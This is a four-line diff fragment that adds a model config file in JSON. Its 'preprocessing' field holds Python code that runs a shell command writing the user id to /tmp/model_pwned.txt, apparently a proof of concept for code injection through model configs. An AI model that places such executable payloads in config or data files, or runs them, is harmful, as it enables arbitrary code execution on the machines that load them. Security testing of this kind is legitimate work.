@@ -1,0 +1,4 @@
+{
+  "preprocessing": "import os; os.system('id > /tmp/model_pwned.txt')",
+  "weights": "dummy_weights.bin"
+}
